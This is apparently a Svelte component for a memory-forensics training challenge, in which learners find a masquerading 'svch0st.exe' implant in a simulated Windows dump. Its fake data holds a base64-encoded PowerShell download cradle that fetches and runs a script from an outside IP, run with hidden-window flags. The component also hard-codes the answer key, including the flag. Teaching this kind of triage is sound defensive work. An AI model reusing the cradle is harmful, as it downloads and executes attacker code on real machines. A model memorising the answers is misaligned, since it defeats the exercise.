<script>
  import { tick } from 'svelte';
  import { progress, setObj, toast } from '../stores/progress.js';

  const PS_B64 = 'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcveC5wczEnKQ==';
  const MEM = {
    profile: 'Win10x64_19041 · 4096 MiB raw dump · KDBG 0xf80761a02b20 · 41 processes',
    ps: [
      [4, 0, 'System', 138, '08:21:01'],
      [372, 4, 'smss.exe', 2, '08:21:04'],
      [512, 504, 'csrss.exe', 11, '08:21:06'],
      [604, 596, 'wininit.exe', 1, '08:21:06'],
      [680, 604, 'services.exe', 6, '08:21:07'],
      [772, 680, 'svchost.exe', 18, '08:21:07'],
      [1188, 680, 'svchost.exe', 24, '08:21:08'],
      [1620, 680, 'lsass.exe', 9, '08:21:08'],
      [2904, 2880, 'explorer.exe', 58, '08:24:11'],
      [3460, 2904, 'chrome.exe', 31, '08:25:02'],
      [4880, 2904, 'svch0st.exe', 7, '09:47:55'],
      [5012, 4880, 'powershell.exe', 9, '09:47:56'],
    ],
    net: [
      ['TCPv4', '10.0.2.15:49677', '13.107.42.14:443', 'ESTABLISHED', 3460],
      ['TCPv4', '10.0.2.15:445', '0.0.0.0:0', 'LISTENING', 4],
      ['TCPv4', '10.0.2.15:50331', '185.220.101.47:443', 'ESTABLISHED', 4880],
      ['UDPv4', '10.0.2.15:138', '*:*', '', 772],
    ],
    cmd: {
      3460: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
      4880: '"C:\\Users\\victim\\AppData\\Local\\Temp\\svch0st.exe"',
      5012: 'powershell.exe -nop -w hidden -enc ' + PS_B64,
    },
    strs: {
      4880: ['svch0st.exe', 'Global\\BV-7f3a-MTX', 'cdn-telemetry.xyz', '185.220.101.47',
        'User-Agent: Mozilla/5.0 (compatible; bvbot/1.0)', 'GET /x.ps1 HTTP/1.1',
        'staging dir: C:\\Windows\\Temp\\~bv.tmp', 'exfil>>QlZ7bTNtMHJ5X2QwbnRfbDEzfQ==', 'done.'],
    },
  };

  function pad(s, n) { s = String(s); return s.length >= n ? s + ' ' : s + ' '.repeat(n - s.length); }
  const banner = () => [
    { kind: 'dim', text: 'memvol 0.9 — read-only triage shell. Image: ' + MEM.profile },
    { kind: 'dim', text: 'Mission: one process is lying about who it is. Find it, find its C2, find what it stole.' },
    { kind: 'dim', text: 'Type help for plugins.' },
    { kind: '', text: '' },
  ];

  let lines = banner();
  let cmdVal = '';
  let outEl;

  async function scrollDown() { await tick(); if (outEl) outEl.scrollTop = outEl.scrollHeight; }

  function memTree(push) {
    const by = {};
    MEM.ps.forEach(p => { (by[p[1]] = by[p[1]] || []).push(p); });
    const pids = new Set(MEM.ps.map(p => p[0]));
    function rec(pid, d) {
      (by[pid] || []).forEach(p => { push('', ' '.repeat(d * 3) + '└─ ' + pad(p[2], 18) + 'pid ' + p[0]); rec(p[0], d + 1); });
    }
    MEM.ps.filter(p => !pids.has(p[1])).forEach(p => { push('', pad(p[2], 21) + 'pid ' + p[0]); rec(p[0], 1); });
  }

  function memMalfind(push) {
    push('hl', 'Process: svch0st.exe   Pid: 4880   PPID: 2904 (explorer.exe)');
    push('', ' Vad Tag: VadS   Protection: PAGE_EXECUTE_READWRITE   Private: True   CommitCharge: 33');
    push('', ' Address: 0x0000000001a40000');
    push('', '   0x1a40000  4d 5a 90 00 03 00 00 00   MZ......');
    push('', '   0x1a40008  e8 1f 01 00 00 5b 81 eb   .....[..');
    push('', '   0x1a40000  4d 5a            dec ebp ; pop edx');
    push('dim', "An 'MZ' (PE header) sitting in a PRIVATE, READ-WRITE-EXECUTE region = a binary injected into running memory. Only pid 4880 has one.");
  }

  function memDecode(arg, push) {
    if (!arg) { push('err', 'usage: decode <base64>'); return; }
    let dec;
    try { dec = atob(arg.trim()); } catch (e) { push('err', 'not valid base64'); return; }
    push('hl', '  → ' + dec);
    if (/DownloadString|New-Object|IEX/i.test(dec)) {
      push('dim', 'That is a download-cradle: it pulls and runs code straight from the C2. Objective cleared.');
      setObj('mem', 'ps', progress);
    }
    if (/^BV\{/.test(dec)) push('dim', 'Looks like a flag — drop it in the findings box below.');
  }

  function runCmd(raw) {
    const line = raw.trim();
    if (!line) return;
    const out = [];
    const push = (kind, text) => out.push({ kind, text });
    out.push({ kind: 'cmd', text: line });
    const parts = line.split(/\s+/);
    const cmd = (parts[0] || '').toLowerCase();
    const arg = parts.slice(1).join(' ');
    if (cmd === 'help') {
      ['plugins',
        '  imageinfo           profile + dump metadata',
        '  pslist              processes:  PID PPID Name Threads Start',
        '  pstree              parent → child tree (spot the odd parent)',
        '  netscan             active network connections + owning PID',
        '  cmdline <pid>       full command line of a process',
        '  strings <pid>       ascii strings carved out of a process',
        '  malfind             injected code / RWX private regions',
        '  decode <base64>     decode a base64 blob you found',
        '  clear               wipe the screen'].forEach((t, i) => push(i === 0 ? 'dim' : '', t));
    } else if (cmd === 'imageinfo') {
      push('hl', MEM.profile);
    } else if (cmd === 'pslist') {
      push('dim', pad('PID', 7) + pad('PPID', 7) + pad('Name', 18) + pad('Thr', 5) + 'Start');
      MEM.ps.forEach(p => push('', pad(p[0], 7) + pad(p[1], 7) + pad(p[2], 18) + pad(p[3], 5) + p[4]));
    } else if (cmd === 'pstree') {
      memTree(push);
    } else if (cmd === 'netscan') {
      push('dim', pad('Proto', 7) + pad('Local', 22) + pad('Remote', 22) + pad('State', 13) + 'PID');
      MEM.net.forEach(n => push('', pad(n[0], 7) + pad(n[1], 22) + pad(n[2], 22) + pad(n[3], 13) + n[4]));
    } else if (cmd === 'cmdline') {
      const pid = +arg;
      if (MEM.cmd[pid]) push('', pad('pid ' + pid + ':', 12) + MEM.cmd[pid]);
      else push('err', 'no cmdline cached for "' + arg + '" (try: ' + Object.keys(MEM.cmd).join(', ') + ')');
    } else if (cmd === 'strings') {
      const pid = +arg;
      if (MEM.strs[pid]) MEM.strs[pid].forEach(s => push('', '  ' + s));
      else push('err', 'no carved strings for "' + arg + '" — the implant is pid 4880');
    } else if (cmd === 'malfind') {
      memMalfind(push);
    } else if (cmd === 'decode') {
      memDecode(arg, push);
    } else if (cmd === 'clear') {
      lines = banner();
      cmdVal = '';
      scrollDown();
      return;
    } else {
      push('err', 'unknown plugin: ' + cmd + ' — type help');
    }
    out.push({ kind: '', text: '' });
    lines = [...lines, ...out];
    cmdVal = '';
    scrollDown();
  }

  function onKeydown(e) { if (e.key === 'Enter') runCmd(cmdVal); }
  function loadChip(c) { cmdVal = c; }

  let f_pid = '', f_c2 = '', f_flag = '';
  function checkFindings() {
    const pid = f_pid.trim(), c2 = f_c2.trim(), fl = f_flag.replace(/\s/g, '');
    let any = false;
    if (pid === '4880') { setObj('mem', 'malpid', progress); any = true; }
    else if (pid) toast('PID ' + pid + ' is not the implant — check pstree/malfind');
    if (/185\.220\.101\.47/.test(c2)) { setObj('mem', 'c2', progress); any = true; }
    else if (c2) toast('that is not the C2 — check netscan for pid 4880');
    if (fl === 'BV{m3m0ry_d0nt_l13}') { setObj('mem', 'flag', progress); any = true; }
    else if (fl) toast('flag mismatch — decode the exfil>> blob in strings 4880');
    if (any) toast('findings logged');
  }

  const chips = ['imageinfo', 'pslist', 'pstree', 'netscan', 'cmdline 4880', 'cmdline 5012', 'strings 4880', 'malfind'];
</script>

<div class="term">
  <div class="term__out" bind:this={outEl}>
    {#each lines as l}
      {#if l.kind === 'cmd'}
        <div><span class="pmt">vol&gt;</span> {l.text}</div>
      {:else if l.kind}
        <div class={l.kind}>{l.text}</div>
      {:else}
        <div>{l.text}</div>
      {/if}
    {/each}
  </div>
  <div class="term__in">
    <span>vol&gt;</span>
    <div class="term-input-wrapper">
      <input autocomplete="off" spellcheck="false" placeholder="type a plugin and hit enter…" bind:value={cmdVal} on:keydown={onKeydown}>
    </div>
  </div>
</div>
<div class="qchips">
  {#each chips as c}<button on:click={() => loadChip(c)}>{c}</button>{/each}
</div>
<div class="objbox" style="margin-top:18px">
  <h4>Submit findings</h4>
  <div class="findform">
    <div><label>Injected process — PID</label><input autocomplete="off" placeholder="e.g. 1234" bind:value={f_pid}></div>
    <div><label>C2 server — ip:port</label><input autocomplete="off" placeholder="e.g. 1.2.3.4:443" bind:value={f_c2}></div>
    <div class="full"><label>Recovered flag</label><input autocomplete="off" placeholder={"BV{...}"} bind:value={f_flag}></div>
  </div>
  <div style="margin-top:12px">
    <button class="btn" on:click={checkFindings}>Check findings</button>
    <span class="prog" style="margin-left:12px;color:var(--ash);font-family:var(--mono)">(decode the -enc payload in the terminal for the 3rd objective)</span>
  </div>
</div>
<div class="hintbox"><b>Field reality:</b> a real <code>svchost.exe</code> is always a child of <code>services.exe</code> (pid 680) and lives in System32. A "svchost" parented to explorer.exe — spelled with a zero — running from <code>\Temp\</code> is the lie. <code>pstree</code> exposes the bad parent, <code>netscan</code> gives you its socket, <code>strings 4880</code> holds what it stole.</div>
